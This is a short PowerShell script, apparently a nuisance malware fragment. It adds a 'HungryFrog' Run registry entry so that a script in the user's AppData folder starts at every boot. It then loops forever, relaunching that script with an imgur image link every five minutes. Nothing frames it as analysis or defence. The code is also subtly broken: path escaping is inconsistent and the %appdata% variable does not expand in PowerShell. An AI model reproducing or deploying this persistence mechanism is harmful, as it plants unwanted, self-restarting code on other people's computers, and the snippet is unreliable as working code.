Set-ItemProperty -Path "HKEY_LOCAL_MACHINE\\SOFTWARE\Microsoft\\Windows\\CurrentVersion\\Run" -name "HungryFrog" -Value "%appdata%\\frog.ps1"

while(1 -eq 1)
{
  Start-Process -FilePath "%appdata%\\frog.ps1" -ArgumentList "https://imgur.com/RS2OVJf";
  Start-Sleep -s 300;
}
